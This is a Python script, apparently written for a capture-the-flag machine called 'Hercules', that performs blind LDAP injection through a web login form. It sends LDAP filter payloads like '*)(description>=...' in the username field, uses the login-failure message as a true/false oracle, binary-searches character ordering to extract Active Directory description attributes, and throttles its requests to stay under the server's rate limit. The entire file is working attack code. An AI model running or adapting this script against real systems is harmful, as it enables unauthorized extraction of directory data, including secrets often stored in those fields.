#!/usr/bin/env python3
"""
Hercules blind LDAP extraction via ordering comparisons (binary search).

Range predicate used for prefix p and ordered candidate list L:
    (description>=p+c) AND (description<p+DEL)     DEL = chr(0x7f)
matches exactly those entries whose description starts with p and whose next
character is >= c  ->  binary search finds the smallest such character, i.e.
the smallest description that has prefix p. An exact test (description=p)
detects end-of-string.

Pacing is ~1 request / 3 s (server allows ~10 per 30 s window).
"""
import re
import sys
import time
import urllib.parse

import requests
import urllib3

urllib3.disable_warnings()

LOGIN = "https://10.129.242.196/Login"
S = requests.Session()
S.verify = False
_tok = {"v": None, "t": 0.0}
GAP = 3.05
REQ = [0]
DEL = chr(0x7F)

# Sliding-window limiter: server allows ~10 requests per ~30 s window.
WIN, LIMIT = 31.0, 9
_stamps = []


def _wait_slot():
    while True:
        now = time.time()
        while _stamps and now - _stamps[0] > WIN:
            _stamps.pop(0)
        if len(_stamps) < LIMIT:
            _stamps.append(now)
            return
        time.sleep(max(0.4, WIN - (now - _stamps[0]) + 0.3))

# ASCII-ordered candidates all guaranteed to sit in AD's collation order
L = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
SYMS = "!@#$%^&*()_+-=.,:;?/|~ "

ATTR = "description"


def dbl(s):
    return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")


def token():
    if _tok["v"] and time.time() - _tok["t"] < 90:
        return _tok["v"]
    r = S.get(LOGIN, timeout=15)
    _tok["v"] = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', r.text).group(1)
    _tok["t"] = time.time()
    return _tok["v"]


def test(inj):
    for _ in range(10):
        _wait_slot()
        body = (f"Username={dbl(inj)}&Password=x&RememberMe=false"
                f"&__RequestVerificationToken={token()}")
        r = S.post(LOGIN, data=body.encode(),
                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                   timeout=20)
        REQ[0] += 1
        if r.status_code == 429:
            _tok["v"] = None
            print(f"      [429 req#{REQ[0]}] sleep 35s", flush=True)
            time.sleep(35)
            continue
        if len(r.text) == 3213:
            _tok["v"] = None
            continue
        return "Login attempt failed" in r.text
    return False


def range_match(p, c):
    """Any value with prefix p whose next char >= c."""
    inj = f"*)({ATTR}>={p}{c})({ATTR}<{p}{DEL}"
    return test(inj)


def exact(p):
    """Any value equal to p exactly (conditions ANDed into the base filter)."""
    return test(f"*)({ATTR}={p})(sAMAccountName=*")


def next_char(p):
    """Smallest character following prefix p (binary search), or None."""
    lo, hi = 0, len(L) - 1
    if not range_match(p, L[lo]):
        # next char is a symbol -> linear scan
        for c in SYMS:
            if test(f"*)({ATTR}={p}{c}*"):
                return c
        return None
    while lo < hi:
        mid = (lo + hi) // 2
        if range_match(p, L[mid]):
            hi = mid
        else:
            lo = mid + 1
    c = L[lo]
    # confirm the character is exactly c (not a larger value)
    nxt = L[lo + 1] if lo + 1 < len(L) else DEL
    if test(f"*)({ATTR}>={p}{c})({ATTR}<{p}{nxt}"):
        return c
    return L[lo]


def extract(prefix, maxlen=45):
    val = prefix
    while len(val) < maxlen:
        c = next_char(val)
        if c is None:
            break
        val += c
        print(f"    {val!r}   (req#{REQ[0]})", flush=True)
    print(f"    end-of-string check for {val!r}: {exact(val)}", flush=True)
    return val


if __name__ == "__main__":
    t0 = time.time()
    if len(sys.argv) > 1 and sys.argv[1] == "seeds":
        print("=== seed characters present in any description ===", flush=True)
        for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
            if test(f"*)({ATTR}={c}*"):
                print(f"  seed '{c}' HIT (req#{REQ[0]})", flush=True)
    else:
        start = sys.argv[1] if len(sys.argv) > 1 else ""
        print(f"=== extracting smallest {ATTR} with prefix {start!r} ===", flush=True)
        v = extract(start)
        print(f"EXTRACTED: {v!r}", flush=True)
    print(f"elapsed {time.time()-t0:.0f}s, {REQ[0]} requests", flush=True)
